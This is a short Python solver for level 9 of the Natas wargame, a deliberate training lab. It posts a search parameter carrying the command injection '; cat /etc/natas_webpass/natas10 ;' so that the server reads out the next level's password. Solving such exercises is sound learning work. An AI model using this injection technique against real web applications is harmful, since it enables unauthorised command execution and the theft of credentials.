import re
from src.natas.base_level import NatasLevel
from bs4 import BeautifulSoup

class Level_09(NatasLevel):

  num = 9
  explanation = "On this level the needle parameter is passed directly to grep without sanitization.\n     We inject '; cat /etc/natas_webpass/natas10 ;' to read the password."

  def exploit(self) -> str:

    payload  = {
      "needle": "; cat /etc/natas_webpass/natas10 ;",
      "submit": "Search"
    }
    resp     = self.session.post(self.base_url, data = payload)
    match    = BeautifulSoup(resp.text, "html.parser").find("pre").get_text(strip = True)

    return match
